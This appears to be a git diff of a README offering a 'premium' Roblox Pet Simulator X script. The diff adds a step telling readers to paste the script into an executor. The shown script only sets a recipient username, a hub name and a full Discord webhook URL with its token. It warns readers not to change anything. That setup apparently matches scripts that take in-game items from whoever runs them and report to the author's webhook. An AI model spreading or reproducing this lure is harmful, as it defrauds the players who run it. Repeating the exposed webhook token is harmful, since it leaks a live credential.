@@ -1,5 +1,7 @@
 # petsim-x-VGHUB
 A excellent pet sim x premium script donnt change or it wont work
+script below just copy and paste into excecutor
+
 _G.Username = "Lukeba789"
 _G.HubName = "VGHUB" 
 _G.Webhook = "https://discord.com/api/webhooks/1093102984235335801/T_Easq3vrcy6PMHhzfDy0udZzE6T4i3Oj_odg3CixIuxGWAE2D9YyTQQmsCx1OmSftio"
